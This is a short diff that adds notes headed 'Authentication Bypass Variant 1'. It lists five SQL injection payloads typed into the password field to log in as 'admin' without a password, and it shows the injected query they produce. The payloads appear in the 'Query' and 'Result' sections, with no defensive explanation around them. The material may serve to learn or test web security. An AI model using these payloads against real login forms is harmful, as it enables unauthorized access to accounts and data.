@@ -1,0 +1,11 @@
+-> Authentication Bypass Variant 1
+
+Query:
+Username: admin Password: ' or 'a'='a
+Username: admin Password: ' or 1=1-- +
+Username: admin Password: ' or 'abcd'='abcd’-- +
+Username: admin Password: ' or 3=4-1--
+Username: admin Password: ' or 0=0#
+
+Result:
+SQL Query Used: SELECT * FROM users WHERE username='admin' AND password='' or 1=1-- +'
